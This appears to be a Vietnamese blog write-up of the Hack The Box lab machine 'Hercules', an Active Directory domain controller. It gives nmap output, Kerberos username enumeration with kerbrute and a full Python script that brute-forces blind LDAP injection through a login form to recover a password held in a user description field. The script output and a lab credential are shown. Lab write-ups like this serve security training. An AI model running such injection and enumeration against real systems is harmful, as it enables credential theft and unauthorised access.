---
layout: post
title: "Hercules"
date: 2026-01-28 14:15:00 +0700
tags: redteam Machine-Insane Windows
categories: jekyll update
--- 

## Recon 

---

```nmap 
# Nmap 7.94SVN scan initiated Wed Nov  5 16:36:53 2025 as: nmap -sC -sV -Pn -T4 -stats-every=5s -oN Hercules 10.10.11.91
Nmap scan report for 10.10.11.91
Host is up (0.31s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://10.10.11.91/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-05 09:38:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-05T09:39:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  5 16:39:55 2025 -- 1 IP address (1 host up) scanned in 182.53 seconds
```

Sau khi scan thì thu được: 
- **53/TCP - domain - Simple DNS Plus**
- **80/TCP - Web Server - Microsoft IIS httpd 10.0**
- **88/TCP - Kerberos-sec - Microsoft Windows Kerbero**
- **135/TCP - msrpc - Microsoft Windows RPC**
- **139/TCP - netbios-ssn - Microsoft Windows netbios-ssn**
- **389/TCP - LDAP - Microsoft Active Directory LDAP**
- **443/TCP - SSL/HTTP - Microsoft IIS httpd 10.0**
- **445/TCP - microsoft-ds? - ?**
- **464/TCP - kpasswd5? - ?**
- **593/TCP - ncacn_http - Microsoft Windows RPC over HTTP 1.0**
- **636/TCP - ssl/ldap - Microsoft Windows Active Directory LDAP (secure)**
- **3268/TCP - LDAP - Microsoft Windows Active Directory Global Catalog**
- **3269/TCP - ssl/ldap - Microsoft Windows Active Directory Global Catalog (secure)**

Sau khi ghi url `hercules.htb` vào trong `/etc/hosts`

Đầu tiên cần recon về cái web này. 

![image](/assets/images/HTB/season9/Hercules/image%201.png)

Như vậy, thấy nó chạy trên `Microsoft-IIS/10.0`

Tiếp tục như vậy thì cho chạy `shortscan` thử 

![image](/assets/images/HTB/season9/Hercules/image%202.png)

Thì sau khi đọc thì thấy có thể bị `web.config` và `precomplied.config`

Thì mình truy cập qua web thì thấy có hai port là `80` và `443`

![image](/assets/images/HTB/season9/Hercules/image%203.png)

Sau khi mình tìm ra được phần `Contact` 

![image](/assets/images/HTB/season9/Hercules/image%204.png)

Nhưng mà nó không có ảnh hưởng gì hay lỗ hổng gì vì nó chỉ là 1 form gửi đến server, ko bị **Stored XSS** hay **SSRF**,...

Và trước đó mình đã recon `http` thì ko có gì xảy ra.

Cho nên mình tiếp tục recon qua `https`. 

![image](/assets/images/HTB/season9/Hercules/imag%205.png)

Từ đây mình thấy nó có endpoint `login`

![image](/assets/images/HTB/season9/Hercules/image%206.png)

Thấy nó ghi là **SSO - Single Sign-On** nghĩa là login 1 lần là truy cập được nhiều dịch vụ.

Nhưng quan trọng là mình ko có thông tin nào về credentials 

Thì mình cũng thử những user mặc định như `admin/admin`,...
nhưng cũng không có kết quả. 

Cho nên mình thử fuzz username - password xem sao. 

![image](/assets/images/HTB/season9/Hercules/image%207.png)

Thì mình thấy thì bị giới hạn login sai. Chỉ còn cách là mình tìm credentials thuiii. 

## Enum Users 

---

```nmap 
└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 05:34:24 >  Using KDC(s):
2025/10/19 05:34:24 >   10.129.x.x:88

2025/10/19 05:34:25 >  [+] VALID USERNAME:       admin@hercules.htb
2025/10/19 05:35:30 >  [+] VALID USERNAME:       administrator@hercules.htb
2025/10/19 05:35:34 >  [+] VALID USERNAME:       Admin@hercules.htb
2025/10/19 05:44:24 >  [+] VALID USERNAME:       Administrator@hercules.htb
2025/10/19 06:21:49 >  [+] VALID USERNAME:       auditor@hercules.htb
2025/10/19 06:50:19 >  [+] VALID USERNAME:       ADMIN@hercules.htb
2025/10/19 06:50:19 >  [+] VALID USERNAME:       will.s@hercules.htb
```

Sau đó, là mình đã tìm ra 1 vài user hợp lệ. 
Nhìn thấy có user `will.s@hercules.htb` thì có thể đây là quy tắc đặt tên cho user là `[name].[character]@hercules.htb` thì ở đoạn `[character]` được load từ `a - z` như vậy có 26 ký tự. 

Như vậy thì mình có thể tự tạo ra 1 danh sách kết hợp với name.txt thì sao để có thể dò tìm ra user khác. 

```python 
with open('/home/kali/Desktop/wordlists/SecLists/Usernames/Names/names.txt', 'r') as file:
    for line in file:
        name = line.strip()
        if not name:
            continue 
        for c in "abcdefghijklmnopqrstuvwxyz":
            print(f"{name}.{c}@hercules.htb")
```

Khi chạy thì cần tạo ra 1 danh sách `python3 generate.py > fuzz_names.txt`

Sau đó, mình chạy lại tool `kerbrute`

```nmap 
└─$ kerbrute userenum -d hercules.htb --dc 10.10.11.91 fuzz_names.txt                                                 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 11:16:16 >  Using KDC(s):
2025/10/19 11:16:16 >   10.10.11.91:88

2025/10/19 11:18:53 >  [+] VALID USERNAME:       adriana.i@hercules.htb
2025/10/19 11:26:10 >  [+] VALID USERNAME:       angelo.o@hercules.htb
2025/10/19 11:32:35 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 11:44:04 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 11:50:57 >  [+] VALID USERNAME:       camilla.b@hercules.htb
2025/10/19 12:00:16 >  [+] VALID USERNAME:       clarissa.c@hercules.htb
2025/10/19 12:12:30 >  [+] VALID USERNAME:       elijah.m@hercules.htb
2025/10/19 12:18:32 >  [+] VALID USERNAME:       fiona.c@hercules.htb
2025/10/19 12:26:30 >  [+] VALID USERNAME:       harris.d@hercules.htb
2025/10/19 12:26:47 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 12:32:15 >  [+] VALID USERNAME:       jacob.b@hercules.htb
2025/10/19 12:35:16 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 12:35:43 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2025/10/19 12:36:45 >  [+] VALID USERNAME:       joel.c@hercules.htb
2025/10/19 12:36:57 >  [+] VALID USERNAME:       johanna.f@hercules.htb
2025/10/19 12:37:01 >  [+] VALID USERNAME:       johnathan.j@hercules.htb
2025/10/19 12:42:48 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 12:58:00 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 13:02:18 >  [+] VALID USERNAME:       mikayla.a@hercules.htb
2025/10/19 13:07:00 >  [+] VALID USERNAME:       natalie.a@hercules.htb
2025/10/19 13:07:07 >  [+] VALID USERNAME:       nate.h@hercules.htb
2025/10/19 13:12:34 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 13:19:01 >  [+] VALID USERNAME:       ramona.l@hercules.htb
2025/10/19 13:20:27 >  [+] VALID USERNAME:       ray.n@hercules.htb
2025/10/19 13:22:20 >  [+] VALID USERNAME:       rene.s@hercules.htb
2025/10/19 13:28:53 >  [+] VALID USERNAME:       shae.j@hercules.htb
2025/10/19 13:33:28 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 13:33:29 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 13:35:45 >  [+] VALID USERNAME:       tanya.r@hercules.htb
2025/10/19 13:38:20 >  [+] VALID USERNAME:       tish.c@hercules.htb
2025/10/19 13:41:56 >  [+] VALID USERNAME:       vincent.g@hercules.htb
2025/10/19 13:43:45 >  [+] VALID USERNAME:       will.s@hercules.htb
2025/10/19 13:46:54 >  [+] VALID USERNAME:       zeke.s@hercules.htb
2025/10/19 13:47:33 >  Done! Tested 264602 usernames (33 valid) in 9077.013 seconds
```

Từ đây mình thu được 1 list các danh sách username như sau: 

```
└─$ cat hercules_users.txt
auditor
administrator
admin
adriana.i
angelo.o
ashley.b
bob.w
camilla.b
clarissa.c
elijah.m
fiona.c
harris.d
heather.s
jacob.b
jennifer.a
jessica.e
joel.c
johanna.f
johnathan.j
ken.w
mark.s
mikayla.a
natalie.a
nate.h
patrick.s
ramona.l
ray.n
rene.s
shae.j
stephanie.w
stephen.m
tanya.r
tish.c
vincent.g
will.s
winda.s
zeke.s
``` 

## LDAP Injection 

---

Quay lại trang login thử xem các username này có thể dùng được ko 

<p align="center">
    <img src="https://hackmd.io/_uploads/SyLufb3l-e.png" width="400px">
</p>

Thì khi mà crendentials mình đoán thì nó sẽ in ra `Invalid login attempt`

Và nếu mình thử user scan ra trong danh sách. 

![image](/assets/images/HTB/season9/Hercules/image%208.png)

Thì nó in ra thông báo là `Login attempt failed` -> thì cho thấy username thì hợp lệ. 

Như vậy có thể thấy nó kiểm tra dựa vào username. Và có ở đây thì có ý tưởng về `LDAP Injection`

- https://bkhost.vn/blog/ldap-injection/ 
- https://0xdf.gitlab.io/2025/04/05/htb-ghost.html 

Trong machine **ghost**, tác giả đã thực hiện **ldap-injection-password-brute-force**, cho nên mình thử thực hiện cách này xem sao. 

![image](/assets/images/HTB/season9/Hercules/image%209.png)

Phát hiện ra 1 thẻ **input**: 

```html
<input class="form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />
```

Được kèm theo 1 token là: 

```
__RequestVerificationToken=fZFHRi40bELcGHanbUkeemm--EIOeve6cCFlATOh7CNCY4LnnZZs_B1rrgCy427eL5z88H7i6WH-Igocf9kA8H-gn51DWmR9WY1CwmYeDWM1
```

Từ đây thì mình đoán được query là `(&(username=*))` thì đây nó sẽ trả về kết quả hợp lệ. 

Nếu mình thử payload là `username=a*`, để xem nó hợp lệ ko nếu hợp lệ thì thử tiếp là `aa*` hay `ab*`, cho đến khi mình có được username. 

Thử encode URL hai lần xem nó có gì khác biệt -> nó in ra `Login attempt failed`

![image](/assets/images/HTB/season9/Hercules/image%2010.png)

Như vậy có nghĩa là hợp lệ, như vậy thì có 1 username bắt đầu bằng `a*` thử tiếp `aa*` hoặc một ký tự nào đó khác `a`. 

![image](/assets/images/HTB/season9/Hercules/image%2011.png)

Ở đây nó là `Invalid login attempt` -> thì mình thử ký tự khác. 

Tiếp tục mình đoán câu query là `(&(username=will.s)(description=*))` với cái payload mình truyền là `will.s)` và `(description=*` để xác định rằng user đó có description được set. 

Mình thử payload `a*` trước. 

![image](/assets/images/HTB/season9/Hercules/image%2012.png)

Từ đây mình xác định là nó ko bắt đầu từ `a*` thì mình viết script tự động làm việc này với 1 danh sách username đã tìm ra. 

```python
import requests 
import string 
import urllib3 
import re 
import time 
import sys 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
TARGET_URL = BASE + LOGIN_PATH 
VERIFY_TLS = False 

SUCCESS_INDICATOR = "Login attempt failed"

TOKEN_RE = re.compile(
    r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"',
    re.IGNORECASE
)

def get_token(session):
    try:
        response = session.get(BASE + "/Login", verify=VERIFY_TLS, timeout=10)

        token = None 
        match = TOKEN_RE.search(response.text)

        if match:
            token = match.group(1)
        
        return token 
    except Exception as e:
        print(f"[!] Error getting token: {e}")
        return None 


def test_ldap_injection(username, description_prefix=""):
    session = requests.Session()

    token = get_token(session)
    if not token:
        return False 

    if description_prefix:
        escaped_desc = description_prefix 
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\29')
        if '\\' in escaped_desc and '\\2' not in escaped_desc:
            escaped_desc = escaped_desc.replace('\\', '\\5c')

        payload = f"{username}*)(description={escaped_desc}*"
    
    else: 
        payload = f"{username}*)(description=*"
    
    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))

    data = {
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }

    try:
        response = session.post(
            TARGET_URL,
            data=data,
            verify=VERIFY_TLS,
            timeout=10
        )

        # Thành công: LDAP filter matched -> "Login attempt failed"
        # Thất bại: LDAP filter didn't matched -> "Invalid Username"
        return SUCCESS_INDICATOR in response.text
    except Exception as e: 
        print(f"[!] Request error: {e}")
        return False 

def enumerate_description(username):

    charset = (
        string.ascii_lowercase + # a - z 
        string.digits + # 0 - 9
        string.ascii_uppercase + # A - Z 
        "!@#$_*-." + # Commmon special chars 
        "%^&()=+[]{}|;:',<>?/`~\" \\" # Less common 
    )

    print(f"\n[*] Checking user: {username}")

    if not test_ldap_injection(username):
        print(f"[-] User {username} has not description field")
        return None 

    print(f"[*] User {username} has a description field, enumerating...")

    description = ""
    max_length = 50 
    no_char_count = 0 

    for position in range(max_length):
        found = False 

        for char in charset: 
            test_desc = description + char 

            if test_ldap_injection(username, test_desc):
                description += char
                print(f"    Position {position}: '{char}' -> Current: {description}")
                found = True 
                no_char_count = 0 
                break 

            time.sleep(0.01)
        
        if not found:
            no_char_count += 1 
            if no_char_count >= 2:
                break 

    if description:
        print(f"[+] Complete: {username} => {description}")
        return description 

    return None 


def read_username(file_path):
    try:
        with open(file_path, 'r') as file:
            usernames = [line.strip() for line in file if line.strip() and not line.startswith('#')]
            return usernames 
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return []
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        return []

def main():
    import argparse 

    parser = argparse.ArgumentParser(
        description='Hercules LDAP Injection'
    )
    parser.add_argument('-u', '--userfile',
                        help='File containing usernames (one per line)')
    parser.add_argument('--user',
                        help='Single username to test')
    parser.add_argument('-t', '--target',
                        help='Target URL (default: https://hercules.htb)')
    parser.add_argument('-o', '--output',
                        default='hercules_passwords.txt',
                        help='Output file (default: hercules_passwords.txt)')

    args = parser.parse_args()

    if args.user:
        usernames = [args.user]
    elif args.userfile:
        usernames = read_username(args.userfile)
        if not usernames:
            print("[!] No usernames to test!")
            return 
    else:
        usernames = [
            "auditor",
            "administrator",
            "admin",
        ]
        print("[*] No userfile specified, using default priority users")
    
    global BASE, TARGET_URL 
    BASE = args.target
    TARGET_URL = BASE + LOGIN_PATH 

    print("="*60)
    print("Hercules LDAP Description/Password Enumeration")
    print(f"Target: {args.target}")
    print(f"Testing {len(usernames)} users")
    print("="*60)

    found_passwords = {}

    for user in usernames:
        password = enumerate_description(user)

        if password:
            found_passwords[user] = password

            with open(args.output, "a") as f:
                f.write(f"{user}:{password}\n")

            print(f"\n[+] FOUND: {user}:{password}\n")

    print("\n" + "="*60)
    print("ENUMERATION COMPLETE")
    print("="*60)

    if found_passwords:
        print(f"\nFound {len(found_password)} passwords:")
        for user, pwd in found_passwords.item():
            print(f"   {user}:{pwd}")
        print(f"\n[+] Results saved to: {args.output}")
    else: 
        print("\nNo password found")


if __name__ == "__main__":
    main()
```

Kết quả thu được:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 script.py -u hercules_user.txt -t https://hercules.htb
============================================================
Hercules LDAP Description/Password Enumeration
Target: https://hercules.htb
Testing 37 users
============================================================

[*] Checking user: auditor
[-] User auditor has not description field

[*] Checking user: administrator
[-] User administrator has not description field

[*] Checking user: admin
[-] User admin has not description field

[*] Checking user: adriana.i
[-] User adriana.i has not description field

[*] Checking user: angelo.o
[-] User angelo.o has not description field

[*] Checking user: ashley.b
[-] User ashley.b has not description field

[*] Checking user: bob.w
[-] User bob.w has not description field

[*] Checking user: camilla.b
[-] User camilla.b has not description field

[*] Checking user: clarissa.c
[-] User clarissa.c has not description field

[*] Checking user: elijah.m
[-] User elijah.m has not description field

[*] Checking user: fiona.c
[-] User fiona.c has not description field

[*] Checking user: harris.d
[-] User harris.d has not description field

[*] Checking user: heather.s
[-] User heather.s has not description field

[*] Checking user: jacob.b
[-] User jacob.b has not description field

[*] Checking user: jennifer.a
[-] User jennifer.a has not description field

[*] Checking user: jessica.e
[-] User jessica.e has not description field

[*] Checking user: joel.c
[-] User joel.c has not description field

[*] Checking user: johanna.f
[-] User johanna.f has not description field

[*] Checking user: johnathan.j
[*] User johnathan.j has a description field, enumerating...
    Position 0: 'c' -> Current: c
    Position 1: 'h' -> Current: ch
    Position 2: 'a' -> Current: cha
    Position 3: 'n' -> Current: chan
    Position 4: 'g' -> Current: chang
    Position 5: 'e' -> Current: change
    Position 6: '*' -> Current: change*
    Position 7: 't' -> Current: change*t
    Position 8: 'h' -> Current: change*th
    Position 9: '1' -> Current: change*th1
    Position 10: 's' -> Current: change*th1s
    Position 11: '_' -> Current: change*th1s_
    Position 12: 'p' -> Current: change*th1s_p
    Position 13: '@' -> Current: change*th1s_p@
    Position 14: 's' -> Current: change*th1s_p@s
    Position 15: 's' -> Current: change*th1s_p@ss
    Position 16: 'w' -> Current: change*th1s_p@ssw
    Position 17: '(' -> Current: change*th1s_p@ssw(
    Position 18: ')' -> Current: change*th1s_p@ssw()
    Position 19: 'r' -> Current: change*th1s_p@ssw()r
    Position 20: 'd' -> Current: change*th1s_p@ssw()rd
    Position 21: '!' -> Current: change*th1s_p@ssw()rd!
    Position 22: '!' -> Current: change*th1s_p@ssw()rd!!
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!!

[+] FOUND: johnathan.j:change*th1s_p@ssw()rd!!


[*] Checking user: ken.w
[-] User ken.w has not description field

[*] Checking user: mark.s
[-] User mark.s has not description field

[*] Checking user: mikayla.a
[-] User mikayla.a has not description field

[*] Checking user: natalie.a
[-] User natalie.a has not description field

[*] Checking user: nate.h
[-] User nate.h has not description field

[*] Checking user: patrick.s
[-] User patrick.s has not description field

[*] Checking user: ramona.l
[-] User ramona.l has not description field

[*] Checking user: ray.n
[-] User ray.n has not description field

[*] Checking user: rene.s
[-] User rene.s has not description field

[*] Checking user: shae.j
[-] User shae.j has not description field

[*] Checking user: stephanie.w
[-] User stephanie.w has not description field

[*] Checking user: stephen.m
[-] User stephen.m has not description field

[*] Checking user: tanya.r
[-] User tanya.r has not description field

[*] Checking user: tish.c
[-] User tish.c has not description field

[*] Checking user: vincent.g
[-] User vincent.g has not description field

[*] Checking user: will.s
[-] User will.s has not description field

[*] Checking user: winda.s
[-] User winda.s has not description field

[*] Checking user: zeke.s
[-] User zeke.s has not description field

============================================================
ENUMERATION COMPLETE
============================================================
Traceback (most recent call last):

```

Mình đã có 1 password của `johnathan.j` => `change*th1s_p@ssw()rd!!`

Sau khi có credential này thì mình thử login vào trong smb để double check lại để đảm bảo valid cre. 

![image](/assets/images/HTB/season9/Hercules/image%2013.png)

Thì lại hiển thị valid với `ken.w`. Cho mình login lại vào bằng `ken.w` và enum ra tất cả users.

![image](/assets/images/HTB/season9/Hercules/image%2014.png)

```
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                   
SMB         dc.hercules.htb 445    dc               Administrator                 2025-10-17 10:49:44 1       Built-in account for administering the computer/domain
SMB         dc.hercules.htb 445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.hercules.htb 445    dc               krbtgt                        2024-12-04 01:39:35 0       Key Distribution Center Service Account
SMB         dc.hercules.htb 445    dc               taylor.m                      2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               fernando.r                    2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               james.s                       2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               anthony.r                     2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               iis_webserver$                2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               iis_hadesapppool$             2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               iis_apppoolidentity$          2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               iis_defaultapppool$           2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               auditor                       2024-12-04 01:44:44 1        
SMB         dc.hercules.htb 445    dc               vincent.g                     2024-12-04 01:44:45 1        
SMB         dc.hercules.htb 445    dc               nate.h                        2024-12-04 01:44:45 1        
SMB         dc.hercules.htb 445    dc               stephen.m                     2024-12-04 01:44:45 1        
SMB         dc.hercules.htb 445    dc               mark.s                        2024-12-04 01:44:46 1        
SMB         dc.hercules.htb 445    dc               elijah.m                      2024-12-04 01:44:46 1        
SMB         dc.hercules.htb 445    dc               angelo.o                      2024-12-04 01:44:46 1        
SMB         dc.hercules.htb 445    dc               ashley.b                      2024-12-04 01:44:46 1        
SMB         dc.hercules.htb 445    dc               clarissa.c                    2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               winda.s                       2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               rene.s                        2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               will.s                        2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               zeke.s                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               adriana.i                     2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               tish.c                        2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               jennifer.a                    2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               shae.j                        2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               joel.c                        2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               jacob.b                       2024-12-04 01:44:47 1        
SMB         dc.hercules.htb 445    dc               web_admin                     2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               bob.w                         2024-12-04 01:44:48 1        
SMB         dc.hercules.htb 445    dc               ken.w                         2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               johnathan.j                   2024-12-04 01:44:48 1       change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               harris.d                      2024-12-04 01:44:48 1        
SMB         dc.hercules.htb 445    dc               ray.n                         2024-12-04 01:44:48 1        
SMB         dc.hercules.htb 445    dc               natalie.a                     2025-11-20 09:34:13 0        
SMB         dc.hercules.htb 445    dc               ramona.l                      2024-12-04 01:44:49 1        
SMB         dc.hercules.htb 445    dc               fiona.c                       2024-12-04 01:44:49 1        
SMB         dc.hercules.htb 445    dc               patrick.s                     2024-12-04 01:44:49 1        
SMB         dc.hercules.htb 445    dc               tanya.r                       2024-12-04 01:44:49 1        
SMB         dc.hercules.htb 445    dc               Admin                         2025-10-17 12:26:46 1        
SMB         dc.hercules.htb 445    dc               [*] Enumerated 42 local users: HERCULES
```

Từ bảng trên thì để thấy có các tài khoản `Administrator`, `Admin`, `web_admin`.

Giờ mình thử quay lại web để login với user là `ken.w` vào xem sao. 





 











